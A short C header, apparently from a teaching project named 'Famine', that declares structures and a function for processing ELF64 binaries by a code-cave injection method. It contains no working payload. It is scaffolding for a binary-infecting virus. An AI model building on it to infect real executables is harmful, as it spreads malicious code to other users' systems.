#ifndef __FAMINE_H__
# define __FAMINE_H__

# include <string.h>
# include <stdio.h>
# include <string.h>
# include <dirent.h>
# include <stdbool.h>
# include <sys/types.h>
# include <sys/stat.h>
# include <unistd.h>
# include <fcntl.h>
# include <sys/mman.h>
# include <sys/syscall.h>
# include <elf.h>
# include <stdlib.h>

# define CODE_CAVE_METHOD 1 << 0


typedef struct	s_code_cave
{
	void	*ptr;
	size_t	size;
	off_t	offset;
}t_code_cave;

typedef struct s_famine
{
	void		*ptr;
	void		*new;
	char		*filename;
	int			fd;
	t_code_cave	cave;
	off_t		size;
	int			method;
} t_famine;

typedef struct s_list
{
	void			*content;
	int				size;
	struct s_list	*next;
}t_list;

void		handle_elf64(t_famine *famine);
#endif
